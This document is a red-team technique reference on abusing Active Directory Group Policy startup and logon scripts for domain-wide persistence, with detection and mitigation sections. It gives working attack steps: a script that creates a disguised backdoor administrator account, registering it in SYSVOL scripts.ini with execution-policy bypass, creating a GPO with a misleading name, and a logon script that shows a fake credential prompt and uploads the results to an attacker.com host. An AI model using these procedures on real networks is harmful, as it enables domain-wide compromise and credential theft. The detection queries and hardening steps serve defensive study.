# [PERSIST-BOOT-003]: Startup Scripts via Group Policy Objects (GPO) for Persistence

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-BOOT-003 |
| **MITRE ATT&CK v18.1** | [T1037 - Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037/); [T1037.001 - Logon Script (Windows)](https://attack.mitre.org/techniques/T1037/001/) |
| **Tactic** | Persistence, Privilege Escalation |
| **Platforms** | Windows Active Directory, Windows Endpoint |
| **Severity** | **Critical** |
| **CVE** | N/A (Configuration-based, not vulnerability) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | Windows Server 2008 R2 - 2025; Windows 7 - 11 (all versions vulnerable if GPO edit access available) |
| **Patched In** | N/A (Requires access control and monitoring) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Group Policy Objects (GPOs) in Active Directory include a feature that allows administrators to assign **logon scripts** (Windows PowerShell, batch, VBScript) and **startup scripts** (Shutdown, Restart) that execute automatically when a user logs in or a computer starts up. These scripts are stored centrally in the **SYSVOL** folder on domain controllers and are replicated to all DCs. An attacker who gains write access to a GPO can inject malicious scripts that will be automatically executed on all computers where that GPO applies, often with **SYSTEM or high-privilege context**. This attack is particularly dangerous because:
- Scripts execute silently without user notification
- They run with the privileges of the target context (SYSTEM for startup scripts, user for logon scripts)
- They execute on every affected machine periodically (GPOs refresh every 90 minutes by default)
- They blend in with legitimate administrative automation

**Attack Surface:** The attack surface includes:
- **GPO storage in SYSVOL** – Centralized, replicated to all DCs
- **Script storage paths** – `\\SYSVOL\Policies\{GUID}\Machine\Scripts\Startup|Shutdown|Logon|Logoff`
- **scripts.ini files** – Configuration files that map scripts to execution triggers
- **GPO ACLs** – Objects controlling who can edit GPOs
- **SYSVOL share permissions** – Share-level access to GPO folders
- **NTFS permissions on scripts** – File-level access control on script files
- **Domain Controller file system access** – Direct SMB access to SYSVOL

**Business Impact:** **An attacker who can inject scripts into domain-wide GPOs can execute arbitrary code on every computer in the affected organizational units, achieving persistent code execution across the entire domain.** This enables:
- Lateral movement to hundreds or thousands of computers automatically
- Installation of backdoors, malware, or ransomware at scale
- Credential harvesting from all affected machines
- Privilege escalation (startup scripts run as SYSTEM)
- Ransomware deployment coordination across the domain
- Evasion of traditional endpoint detection (script executes with trust as "legitimate IT automation")

**Technical Context:** Script execution occurs automatically during system startup or user logon. For startup scripts, execution happens before interactive logon, meaning they run even on unattended servers. Scripts complete in seconds to minutes, executing silently in the background. Detection difficulty is **Medium-High** because:
- GPO changes may be logged but monitoring is often incomplete
- SYSVOL writes generate high data volume, making detection challenging without proper filtering
- Script execution blends with legitimate administrative automation
- Attacks often modify existing GPOs rather than creating new ones, appearing as routine policy updates

### Operational Risk

- **Execution Risk:** **Low-Medium** – Requires:
  - Write access to GPOs (via compromised admin account, or directly via SYSVOL SMB access)
  - Understanding of GPO structure and script paths
  - Knowledge of target organization's OU structure to maximize impact
  - No special tools required (standard Windows/PowerShell available)
- **Stealth:** **Medium** – SYSVOL file modifications can generate many audit events. However, attackers often:
  - Modify existing GPOs (less noticeable than creating new ones)
  - Place scripts in non-obvious paths
  - Name scripts to blend with legitimate administration
  - Execute scripts with minimal logging
- **Reversibility:** **No** – Once a startup script is injected, it will continue executing on every system refresh until manually removed. Can impact thousands of machines simultaneously.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 5.13 (Restrict who can edit GPOs), CIS 5.14 (Monitor SYSVOL) | GPO modification should be restricted to authorized admins and monitored. |
| **DISA STIG** | WN10-CC-000080 (Restrict Group Policy modification) | Only authorized administrators should be able to create or modify GPOs. |
| **CISA SCuBA** | Identity and Access Management | Critical infrastructure must require multi-factor authentication and approval for GPO changes. |
| **NIST 800-53** | AC-3 (Access Control), AU-2 (Audit Events), SI-7 (Software Integrity) | All changes to policy infrastructure must be logged, authorized, and monitored. |
| **GDPR** | Art. 32 (Security of Processing) | Organizations must protect critical infrastructure (policy servers) against unauthorized modification. |
| **DORA** | Art. 9 (Protection and Prevention) | Critical systems must have protection against mass code injection. |
| **NIS2** | Art. 21 (Cybersecurity Risk Management Measures) | Critical network systems must include change control and monitoring. |
| **ISO 27001** | A.9.2.2 (User Access Rights Review), A.12.2.1 (Change Log) | All changes to administrative privileges and configurations must be logged. |
| **ISO 27005** | Risk Assessment - "Unauthorized Policy Modification" | GPO modification represents a high-impact, high-likelihood risk scenario. |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**
- **GPO Edit access** (requires Domain Administrator or delegated GPO editing rights) – OR –
- **Direct SYSVOL write access** (if NTFS permissions are weak)
- **Create/Modify scripts.ini files** in SYSVOL folders

**Required Access:**
- SMB access to SYSVOL shares on domain controllers (`\\DC\SYSVOL` or `\\domain.local\SYSVOL`)
- Write access to target GPO folders: `Policies\{GUID}\Machine\Scripts\Startup|Shutdown`
- Ability to authenticate as an account with sufficient permissions
- Network access to domain controllers (ports 445/139 for SMB)

**Supported Versions:**
- **Windows Server:** 2008 R2, 2012, 2012 R2, 2016, 2019, 2022, 2025
- **Client Windows:** Windows 7, 8, 8.1, 10, 11
- **Supported Script Types:**
  - PowerShell (.ps1)
  - Batch/CMD (.bat, .cmd)
  - VBScript (.vbs)
  - JavaScript (.js)

**Tools:**
- Standard Windows tools: `Group Policy Editor (gpedit.msc)`, `Active Directory Users & Computers (dsa.msc)`, `gpupdate.exe`
- PowerShell: `New-GPO`, `Set-GPRegistryValue`, `Copy-Item` (for SYSVOL writes)
- Impacket tools: `smbclient.py`, `Get-DomainGPO` (PowerView)
- [ScriptSentry](https://github.com/flwr4lfl0wer/ScriptSentry) – Permission auditing tool
- [BlooodyAD](https://github.com/CravateC2/bloodyAD) – GPO manipulation via AD

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Step 1: Enumerate Existing GPOs and Their Scope

**Objective:** Identify all GPOs in the domain and which OUs they target (to find highest-impact injection points).

**Command (PowerShell - Using Group Policy Cmdlets):**

```powershell
# Get all GPOs in the domain
Get-GPO -All | Select-Object DisplayName, Owner, ModificationTime

# Get GPOs linked to specific OU (e.g., Domain Controllers OU is highest impact)
Get-GPInheritance -Target "OU=Domain Controllers,DC=corp,DC=local"
```

**Command (PowerShell - Using Active Directory module):**

```powershell
# List all GPOs with their scope
Import-Module ActiveDirectory
Get-ADObject -Filter {objectClass -eq "groupPolicyContainer"} -Properties displayName, gPCFileSysPath | Select-Object DisplayName, gPCFileSysPath

# Example output:
# DisplayName        gPCFileSysPath
# Default Domain     \\dc01.corp.local\sysvol\corp.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
# Default DC         \\dc01.corp.local\sysvol\corp.local\Policies\{6AC1786C-016F-11D2-945F-00C04FB984F9}
```

**What to Look For:**
- High-impact GPOs:
  - `Domain Controllers OU` – Runs on all DCs (highest privilege)
  - `Servers OU` – Affects all servers
  - `Domain` root – Affects all computers in domain
- GPO GUID (identifies the folder in SYSVOL where scripts are stored)

### Step 2: Check Current Script Assignments

**Objective:** Identify which GPOs already have scripts to understand legitimate automation (for stealth, modify existing scripts rather than add new ones).

**Command (PowerShell):**

```powershell
# List scripts assigned to GPOs
Get-GPO -All | ForEach-Object {
    $gpo = $_
    $scripts = Get-GPRegistryValue -Name $gpo.DisplayName -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts" -ErrorAction SilentlyContinue
    
    if ($scripts) {
        Write-Host "GPO: $($gpo.DisplayName)"
        Write-Host "  Startup Scripts: $(($scripts | Where-Object ValueName -eq 'Startup').Value)"
        Write-Host "  Logon Scripts: $(($scripts | Where-Object ValueName -eq 'Logon').Value)"
    }
}
```

**Alternative: Inspect scripts.ini Files Directly**

```powershell
# Access scripts.ini for a specific GPO
$gpoGUID = "{6AC1786C-016F-11D2-945F-00C04FB984F9}"  # Domain Controllers GPO
$scriptsPath = "\\dc01.corp.local\SYSVOL\corp.local\Policies\$gpoGUID\Machine\Scripts"

Get-Content "$scriptsPath\scripts.ini"

# Output format:
# [Startup]
# 0CmdLine=legacy.cmd
# 0Parameters=
```

**What to Look For:**
- Existing startup/shutdown scripts to understand automation patterns
- Script paths (can inject malicious scripts in same location)

### Step 3: Check GPO and SYSVOL Permissions

**Objective:** Identify weakly permissioned GPOs that can be modified with lower privileges.

**Command (PowerShell - GPO ACL Check):**

```powershell
# Check who can edit a specific GPO
$gpoName = "Domain Controllers"
$gpo = Get-GPO -Name $gpoName

# Get ACL on the GPO
$gpoContainer = Get-ADObject -Identity $gpo.Id
$acl = Get-Acl "AD:\$($gpoContainer.DistinguishedName)"

$acl.Access | Select-Object IdentityReference, ActiveDirectoryRights, AccessControlType | Format-Table -AutoSize

# Look for overly permissive rights:
# - "Everyone": write access
# - "Authenticated Users": create/delete/modify
# - Non-admin groups: Any write access
```

**Command (Check SYSVOL Share Permissions):**

```powershell
# Check share-level permissions on SYSVOL
Get-SmbShare -Name "SYSVOL" | Get-SmbShareAccess | Format-Table -AutoSize

# Expected: Only Administrators, Domain Admins, SYSTEM
# Warning: If Authenticated Users or Everyone has Change access, weak security
```

**Command (Check NTFS Permissions on GPO Folders):**

```powershell
# Check file system permissions on a specific GPO folder
$gpoGUID = "{6AC1786C-016F-11D2-945F-00C04FB984F9}"
$gpoPath = "C:\Windows\SYSVOL\domain\Policies\$gpoGUID"

Get-Acl $gpoPath | Format-List

# Look for:
# - Non-administrators with WriteData/Modify permissions
# - "Authenticated Users" or "Domain Users" with write access
```

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Inject Script via Existing GPO (Least Noticeable)

**Supported Versions:** All Windows Server 2008 R2 - 2025

**Prerequisite:** Attacker has compromised a Domain Admin account OR has direct write access to SYSVOL.

#### Step 1: Identify High-Impact GPO

**Objective:** Choose a GPO that affects the most important systems (Domain Controllers OUfor maximum privilege).

**Command (PowerShell):**

```powershell
# Get Domain Controllers GPO (standard in all AD environments)
$dcGPO = Get-GPO -Name "Default Domain Controller Policy"
$gpoID = $dcGPO.Id

Write-Host "Target GPO: $($dcGPO.DisplayName)"
Write-Host "GUID: $gpoID"
Write-Host "SYSVOL Path: \\<dc>\sysvol\<domain>\Policies\$gpoID"
```

#### Step 2: Create Malicious Script

**Objective:** Write a PowerShell script that will be executed on target systems.

**Example: Persistence Script (Add Backdoor User)**

```powershell
# File: malicious_startup.ps1
# This script will execute every time a Domain Controller starts

# Create a hidden backdoor user account
$username = "svc_backup"
$password = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force

# Create local admin account (will replicate if part of domain logon script)
try {
    New-LocalUser -Name $username -Password $password -FullName "Backup Service" -Description "Legitimate backup account" -ErrorAction Stop | Add-LocalGroupMember -Group "Administrators" -ErrorAction Stop
    # Add to RDP group for remote access
    Add-LocalGroupMember -Group "Remote Desktop Users" -Member $username -ErrorAction SilentlyContinue
} catch {
    # User already exists, just ensure it's in admin group
    Add-LocalGroupMember -Group "Administrators" -Member $username -ErrorAction SilentlyContinue
}

# Alternative: Reverse shell / C2 callback
# $null = (New-Object System.Net.WebClient).DownloadString('http://attacker.com/beacon.ps1')
```

#### Step 3: Place Script in SYSVOL

**Objective:** Copy the malicious script to the GPO's script folder in SYSVOL.

**Command (PowerShell - If Domain Admin):**

```powershell
# Copy script to Domain Controllers GPO startup folder
$gpoGUID = "{6AC1786C-016F-11D2-945F-00C04FB984F9}"  # Standard DC GPO GUID
$dcName = "dc01.corp.local"
$sysvol = "\\$dcName\sysvol\corp.local\Policies\$gpoGUID\Machine\Scripts\Startup"

# Create directory if it doesn't exist
New-Item -ItemType Directory -Path $sysvol -Force | Out-Null

# Copy malicious script
Copy-Item -Path "C:\temp\malicious_startup.ps1" -Destination "$sysvol\startup.ps1" -Force
```

**Command (Bash/Linux - Using smbclient if SYSVOL has weak permissions):**

```bash
# If directly connecting to SYSVOL via SMB
smbclient -U CORP/attacker //dc01.corp.local/sysvol
cd Policies/6AC1786C-016F-11D2-945F-00C04FB984F9/Machine/Scripts/Startup
put malicious_startup.ps1 startup.ps1
exit
```

#### Step 4: Register Script in scripts.ini

**Objective:** Add the script to the scripts.ini file so GPO processing executes it.

**Command (PowerShell):**

```powershell
# Read existing scripts.ini
$scriptsIniPath = "$sysvol\scripts.ini"
$scriptsContent = Get-Content $scriptsIniPath -ErrorAction SilentlyContinue

# If scripts.ini doesn't exist, create it
if (-not $scriptsContent) {
    @"
[Startup]
0CmdLine=powershell.exe
0Parameters=-ExecutionPolicy Bypass -File startup.ps1
"@ | Out-File $scriptsIniPath -Encoding ASCII
} else {
    # Append to existing scripts.ini
    Add-Content $scriptsIniPath "`n[Startup]"
    Add-Content $scriptsIniPath "0CmdLine=powershell.exe"
    Add-Content $scriptsIniPath "0Parameters=-ExecutionPolicy Bypass -File startup.ps1"
}
```

**Alternative: Direct File Edit (Bash):**

```bash
# Directly modify scripts.ini using text tools
echo "[Startup]" >> scripts.ini
echo "0CmdLine=powershell.exe" >> scripts.ini
echo "0Parameters=-ExecutionPolicy Bypass -File startup.ps1" >> scripts.ini
```

**What This Means:**
- The script is now registered in the GPO
- On next gpupdate/gprefresh, all affected systems will download and execute the script

#### Step 5: Trigger GPO Refresh

**Objective:** Force systems to apply the updated GPO immediately (rather than waiting 90 minutes).

**Command (PowerShell - Force refresh on DC):**

```powershell
# Force Group Policy update (can be done on individual systems or remotely)
gpupdate /force

# For remote systems (if you have RDP/WMI access)
Invoke-Command -ComputerName "server01.corp.local" -ScriptBlock { gpupdate /force }
```

**What This Means:**
- The malicious startup script will now execute on the next system boot
- On Domain Controllers, it executes with SYSTEM privilege
- The backdoor user account is created (or maintained) automatically

---

### METHOD 2: Create New Malicious GPO (Stealthier for Attacker with Admin Rights)

**Supported Versions:** All Windows Server 2008 R2 - 2025

**Prerequisite:** Domain Admin or GPO creation rights.

#### Step 1: Create a New GPO

**Command (PowerShell):**

```powershell
# Create a new GPO with a benign-sounding name
$gpoName = "Windows Update Configuration"
$newGPO = New-GPO -Name $gpoName -Comment "Automated maintenance policy"

Write-Host "Created GPO: $($newGPO.DisplayName) (GUID: $($newGPO.Id))"
```

#### Step 2: Add Startup Script to New GPO

**Command (PowerShell - Using GPO cmdlets):**

```powershell
# Use the Group Policy interface to add script
$gpoName = "Windows Update Configuration"

# Set the script path in PowerShell Scripts (User context)
Set-GPRegistryValue -Name $gpoName `
    -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Scripts\Startup\0" `
    -ValueName "ScriptPath" `
    -Value "startup.ps1" `
    -Type String
```

**Alternative: Direct SYSVOL Method**

```powershell
$gpoGUID = $newGPO.Id
$gpoPath = "\\dc01.corp.local\sysvol\corp.local\Policies\$gpoGUID"

# Create scripts folder structure
New-Item -ItemType Directory -Path "$gpoPath\Machine\Scripts\Startup" -Force | Out-Null

# Place malicious script
Copy-Item -Path "C:\temp\malicious_startup.ps1" -Destination "$gpoPath\Machine\Scripts\Startup\startup.ps1"

# Create scripts.ini
@"
[Startup]
0CmdLine=powershell.exe
0Parameters=-ExecutionPolicy Bypass -File startup.ps1
"@ | Out-File "$gpoPath\Machine\Scripts\scripts.ini" -Encoding ASCII
```

#### Step 3: Link GPO to Target OU

**Objective:** Apply the GPO to the organizational units containing target systems.

**Command (PowerShell - Link to Domain Controllers OU):**

```powershell
# Link to Domain Controllers OU for maximum impact
New-GPLink -Name "Windows Update Configuration" `
    -Target "OU=Domain Controllers,DC=corp,DC=local" `
    -LinkEnabled Yes -Enforced Yes

# Or link to the entire domain
New-GPLink -Name "Windows Update Configuration" `
    -Target "DC=corp,DC=local" `
    -LinkEnabled Yes
```

**What This Means:**
- The GPO is now linked to the target OU
- All systems in that OU will apply the policy on next gpupdate
- The malicious script is now part of the standard GPO processing

---

### METHOD 3: Logon Script Injection (User-Context Execution)

**Supported Versions:** All Windows Server 2008 R2 - 2025

**Prerequisite:** Need ability to modify GPOs or SYSVOL; executes in user context (less powerful than startup scripts but can target specific users).

#### Step 1: Identify or Create Target GPO for User Logon Scripts

```powershell
# For example, modify a user OU's GPO
$ouPath = "OU=Users,DC=corp,DC=local"
Get-GPInheritance -Target $ouPath
```

#### Step 2: Create User Logon Script

```powershell
# File: malicious_logon.ps1
# Executes every time a user logs in

# Harvest credentials
$cred = Get-Credential -Message "Windows Security Update Required"
$cred | ConvertTo-Json | Out-File "$env:TEMP\creds.json"

# Exfiltrate to attacker server
(New-Object System.Net.WebClient).UploadFile('http://attacker.com/upload.php', "$env:TEMP\creds.json")

# Add persistent backdoor per user
New-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Startup" -ItemType Directory -Force | Out-Null
Copy-Item -Path "$env:TEMP\backdoor.exe" -Destination "$env:APPDATA\Microsoft\Windows\Start Menu\Startup\" -Force
```

#### Step 3: Place Script and Configure GPO

Same as Method 1, Steps 3-5 (Place in SYSVOL, register in scripts.ini, trigger refresh).

**What This Means:**
- Script runs with user privileges (less powerful than startup scripts)
- Can harvest user credentials or install user-level persistence
- Executes on every user logon across affected systems

---

## 5. ATTACK SIMULATION & VERIFICATION

### Manual Test: GPO Script Injection

**Test Environment:** Domain with Domain Controller, test machine in controllable OU.

**Test Steps:**

1. **Create test GPO:**
   ```powershell
   New-GPO -Name "Test Startup Script"
   ```

2. **Create test script** (write to temp location):
   ```powershell
   @"
   $timestamp = Get-Date
   "Script executed at $timestamp" | Out-File C:\Temp\script_test.log
   "@ | Out-File C:\Temp\test_startup.ps1
   ```

3. **Copy to SYSVOL:**
   ```powershell
   $gpoGUID = (Get-GPO -Name "Test Startup Script").Id
   $scriptPath = "\\dc01\sysvol\corp.local\Policies\$gpoGUID\Machine\Scripts\Startup"
   New-Item -ItemType Directory -Path $scriptPath -Force
   Copy-Item C:\Temp\test_startup.ps1 -Destination $scriptPath
   ```

4. **Link to test OU:**
   ```powershell
   New-GPLink -Name "Test Startup Script" -Target "OU=Test,DC=corp,DC=local"
   ```

5. **Force GPO update on test machine:**
   ```powershell
   Invoke-Command -ComputerName testmachine -ScriptBlock { gpupdate /force }
   ```

6. **Reboot test machine:**
   ```powershell
   Restart-Computer -ComputerName testmachine
   ```

7. **Verify script executed:**
   ```powershell
   Get-Content \\testmachine\c$\Temp\script_test.log
   # Should show: Script executed at [timestamp]
   ```

---

## 6. TOOLS & COMMANDS REFERENCE

### Group Policy Management Cmdlets

**Module:** GroupPolicy (built-in, no installation needed)

**Installation:**
```powershell
Import-Module GroupPolicy
```

**Usage:**
```powershell
Get-GPO -All
New-GPO -Name "MyPolicy"
Set-GPRegistryValue -Name "MyPolicy" -Key "HKLM\..." -ValueName "Value" -Value "Data"
New-GPLink -Name "MyPolicy" -Target "OU=..."
```

### Active Directory PowerShell Module

**Module:** ActiveDirectory

**Installation:**
```powershell
Import-Module ActiveDirectory
```

**Usage:**
```powershell
Get-ADObject -Filter {objectClass -eq "groupPolicyContainer"}
Get-ADOrganizationalUnit -Filter {Name -eq "Domain Controllers"}
```

### ScriptSentry (Permission Auditing)

**URL:** https://github.com/flwr4lfl0wer/ScriptSentry

**Usage:**
```powershell
.\ScriptSentry.ps1 -Domain corp.local
# Identifies GPOs with weak permissions on logon scripts
```

---

## 7. MICROSOFT SENTINEL DETECTION

### Query 1: GPO Modification Attempts (Event ID 5136)

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID, ObjectDN, AttributeValue
- **Alert Severity:** High
- **Frequency:** Real-time
- **Applies To:** Domain Controllers

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 5136  // Directory Service Changes
| where ObjectDN has "CN=Policies"  // GPO modification
| where AttributeValueString contains "scripts" or AttributeValueString contains "Startup" or AttributeValueString contains "Logon"
| extend ChangedBy = SubjectUserName
| extend TargetGPO = extract("CN=({.*?})", 1, ObjectDN)
| project 
    TimeGenerated,
    Computer,
    ChangedBy,
    TargetGPO,
    AttributeName,
    AttributeValueString
| sort by TimeGenerated desc
```

### Query 2: SYSVOL File Modifications (Script File Creation)

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** ObjectName, AccessMask
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To:** File System on Domain Controllers

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 4663  // File System Object Access
| where ObjectName has "\\Policies\\" and ObjectName has "\\Scripts\\"
| where ObjectName has_any (".ps1", ".bat", ".vbs", ".js", ".cmd")
| where AccessMask in ("0x2", "0x40", "0x100")  // Write, Create, Append
| extend 
    GPOPath = extract("(.*?Scripts.*)", 1, ObjectName),
    ScriptName = extract("(\\.*)", 1, ObjectName)
| project 
    TimeGenerated,
    Computer,
    SubjectUserName,
    GPOPath,
    ScriptName,
    AccessMask
| sort by TimeGenerated desc
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: GPO Script File Creation in SYSVOL

**Rule Configuration:**
- **Required Index:** main
- **Required Sourcetype:** WinEventLog:Security
- **Event ID:** 4663, 4656
- **Alert Threshold:** Any file creation in `*\Policies\*\Scripts\*`

**SPL Query:**

```
index=main sourcetype="WinEventLog:Security" EventCode=4663
ObjectName="*\\Policies\\*\\Scripts\\*"
(ObjectName="*.ps1" OR ObjectName="*.bat" OR ObjectName="*.vbs")
NOT user="NT AUTHORITY*"
| stats count by user, ObjectName, Computer
| where count >= 1
```

### Rule 2: GPO Modified Without Proper Change Control

**Rule Configuration:**
- **Required Index:** main
- **Required Sourcetype:** WinEventLog:Security
- **Event ID:** 5137 (Directory Service Object Created) or 5136 (Modified)

**SPL Query:**

```
index=main sourcetype="WinEventLog:Security" EventCode=5137
ObjectDN="*,CN=Policies,CN=System,*"
NOT user IN (approved_admins_list)
| stats count by user, ObjectName
```

---

## 9. WINDOWS EVENT LOG MONITORING

**Event ID: 5136** (A directory service object was modified)
- **Log Source:** Security
- **Trigger:** Modification of objects under `CN=Policies`
- **Fields:** SubjectUserName, ObjectDN, AttributeName, AttributeValueString
- **Alert:** Script-related attribute changes by non-standard admins

**Event ID: 5137** (A directory service object was created)
- **Log Source:** Security
- **Trigger:** Creation of new GPO in Policies container
- **Alert:** New GPO creation outside change windows

**Event ID: 4663** (An attempt was made to access an object)
- **Log Source:** Security
- **Trigger:** File writes to SYSVOL\Policies\{GUID}\Scripts
- **Alert:** Script file creation in GPO folders

### Manual Configuration Steps (Enable Auditing)

1. Open **Group Policy Management Console** (gpmc.msc) on Domain Controller
2. Navigate to **Policies** container → **Properties**
3. Go to **Security** tab → **Advanced** → **Auditing**
4. Add audit rule: **Everyone**, **All**, **All Modify**, **Success & Failure**
5. Enable **Audit Directory Service Changes** on Domain Controllers:
   - Open **Group Policy Management**
   - Create new GPO linked to **Domain Controllers OU**
   - Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Directory Service Access**
   - Enable **Audit Directory Service Changes** = Success, Failure

---

## 10. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

**Sysmon Configuration:**

```xml
<!-- Detect script execution from SYSVOL paths -->
<ProcessCreate onmatch="include">
  <CommandLine condition="contains any">
    C:\Windows\SYSVOL;
    \\SYSVOL\;
    Group Policy;
    Scripts\Startup;
    Scripts\Logon
  </CommandLine>
  <Image condition="is">C:\Windows\System32\powershell.exe</Image>
</ProcessCreate>

<!-- Detect file writes to SYSVOL script folders -->
<FileCreate onmatch="include">
  <TargetFilename condition="contains">SYSVOL</TargetFilename>
  <TargetFilename condition="contains any">\Scripts\Startup, \Scripts\Logon, \Scripts\Shutdown</TargetFilename>
</FileCreate>
```

---

## 11. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

#### Action 1: Restrict GPO Edit Permissions to Minimal Admin Set

**Objective:** Only Domain Admins (or dedicated GPO admins) can modify GPOs; monitor and log all changes.

**Manual Steps (PowerShell - Set GPO Permissions):**

```powershell
# Remove dangerous permissions from all GPOs
$allGPOs = Get-GPO -All

foreach ($gpo in $allGPOs) {
    # Get GPO container in AD
    $gpoContainer = Get-ADObject -Identity $gpo.Id
    $acl = Get-Acl "AD:\$($gpoContainer.DistinguishedName)"
    
    # Remove "Authenticated Users" modify access (if present)
    $rulesToRemove = $acl.Access | Where-Object {
        $_.IdentityReference -like "*Authenticated Users*" -and
        $_.AccessControlType -eq "Allow" -and
        $_.ActiveDirectoryRights -match "CreateChild|DeleteChild|WriteProperty"
    }
    
    foreach ($rule in $rulesToRemove) {
        $acl.RemoveAccessRule($rule)
        Write-Host "Removed overly-permissive rule from $($gpo.DisplayName)"
    }
    
    # Set ACL to allow only Domain Admins
    $adminRule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        (New-Object System.Security.Principal.SecurityIdentifier "S-1-5-21-*-512"),  # Domain Admins
        [System.DirectoryServices.ActiveDirectoryRights]"GenericAll",
        [System.Security.AccessControl.AccessControlType]::Allow
    )
    $acl.AddAccessRule($adminRule)
    
    Set-Acl "AD:\$($gpoContainer.DistinguishedName)" $acl
}
```

**Manual Steps (Group Policy - Restrict GPO Modification):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Select **Group Policy Objects** folder
3. Right-click **Domain Admins** → **Filter by Owner**
4. For each GPO:
   - Right-click → **Properties** → **Security**
   - Remove all permissions except **Domain Admins** (Full Control)
   - Click **Apply**

#### Action 2: Enable SYSVOL Auditing (File System)

**Objective:** Log all writes to SYSVOL script folders; alert on modifications.

**Manual Steps (Enable File System Auditing on Domain Controllers):**

1. On Domain Controller, open **File Explorer**
2. Navigate to `C:\Windows\SYSVOL\domain\Policies`
3. Right-click → **Properties** → **Security** → **Advanced** → **Auditing**
4. Add audit rule:
   - Principal: **Everyone**
   - Type: **All**
   - Applies to: **This folder, subfolders, and files**
   - Permissions: **Create files/write data**, **Modify**
   - Check: **Success** and **Failure**
5. Apply and propagate to subfolders

**Alternative (PowerShell):**

```powershell
# Enable auditing on SYSVOL scripts folder
$acl = Get-Acl "C:\Windows\SYSVOL\domain\Policies"

# Create audit rule
$auditRule = New-Object System.Security.AccessControl.FileSystemAuditRule(
    "Everyone",
    "Modify,CreateFiles,WriteData",
    "ContainerInherit,ObjectInherit",
    "InheritOnly",
    "Success,Failure"
)
$acl.AddAuditRule($auditRule)
Set-Acl "C:\Windows\SYSVOL\domain\Policies" $acl
```

#### Action 3: Monitor and Alert on GPO Changes

**Objective:** Detect any GPO modifications in real-time.

**Manual Steps (Enable Advanced Audit Policy):**

1. On Domain Controller, run **auditpol.exe**:
   ```cmd
   auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable
   ```

2. Create SIEM alert rule (e.g., in Splunk/Sentinel) to trigger on:
   - Event ID 5136 with ObjectDN containing "CN=Policies"
   - Event ID 5137 (new GPO creation)
   - Any modification outside of scheduled change windows

### Priority 2: HIGH

#### Action 4: Implement Change Control for GPO Modifications

**Objective:** Require approval and documentation before GPO changes.

**Manual Steps:**

1. Create a GPO Change Request process:
   - Approval required from change board
   - Documented testing and rollback plan
   - Change window scheduling
   
2. Restrict GPO editing to a subset of admins who follow the process

3. Implement automated diff/version control:
   ```powershell
   # Backup all GPOs regularly
   $backupPath = "C:\GPO_Backups\$(Get-Date -Format 'yyyyMMdd')"
   New-Item -ItemType Directory -Path $backupPath -Force | Out-Null
   
   Get-GPO -All | Backup-GPO -Path $backupPath
   ```

#### Action 5: Restrict SYSVOL Share Access

**Objective:** Limit who can access SYSVOL via SMB.

**Manual Steps (Harden SMB Share Permissions):**

```powershell
# Grant SMB access only to Domain Admins and Authenticated Users (read-only)
$smbShare = Get-SmbShare -Name "SYSVOL"

# Grant Authenticated Users read-only
$acl = icacls "C:\Windows\SYSVOL" /grant "NT AUTHORITY\Authenticated Users:(OI)(CI)RX" /inheritance:r

# Verify only Domain Admins have modify
icacls "C:\Windows\SYSVOL"
```

---

## 12. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Filesystem Indicators:**
- New PowerShell/batch files in `C:\Windows\SYSVOL\domain\Policies\{GUID}\Machine\Scripts\`
- Modified `scripts.ini` files with suspicious entries
- File timestamps indicating off-hours modifications
- Files with suspicious names (e.g., "update.ps1" instead of legitimately named scripts)

**Event Log Indicators:**
- Event ID 5136: Modification of objects under CN=Policies by non-standard admins
- Event ID 4663: File creation/modification in SYSVOL\Policies\*\Scripts\
- Event ID 4688: Script execution (powershell.exe, cscript.exe) with parameters containing SYSVOL paths
- Unusual number of modifications to GPO objects within short timeframe

**Detection Patterns:**
- Non-admin account modifying GPO ACLs + adding script within minutes
- New script file in SYSVOL + linked GPO + applied to multiple OUs
- Script parameter containing suspicious URLs or IP addresses

---

### Forensic Artifacts

**Disk:**
- Script files in: `C:\Windows\SYSVOL\domain\Policies\{GUID}\Machine\Scripts\`
- NTFS timestamps on script files (creation/modification times)
- `scripts.ini` configuration files

**Event Logs:**
- Security Event Log: Events 5136, 5137, 4663, 4688
- System Event Log: GPO application events
- PowerShell Event Log: Script execution (if enabled)

**AD Objects:**
- GPO container attributes and modification timestamps
- GPO ACLs showing who has edit permissions
- gPCFileSysPath showing SYSVOL location

---

### Response Procedures

#### 1. Immediate Containment

```powershell
# Identify affected GPO(s)
$affectedGPO = Get-GPO -Name "Windows Update Configuration"  # (or identify by Event Log)

# Remove the malicious script from SYSVOL
$gpoID = $affectedGPO.Id
$scriptPath = "\\dc01\sysvol\corp.local\Policies\$gpoID\Machine\Scripts\Startup"
Remove-Item "$scriptPath\startup.ps1" -Force -Confirm:$false

# Edit scripts.ini to remove entry
$scriptsIni = "$scriptPath\scripts.ini"
(Get-Content $scriptsIni) | Where-Object { $_ -notmatch "startup.ps1" } | Set-Content $scriptsIni

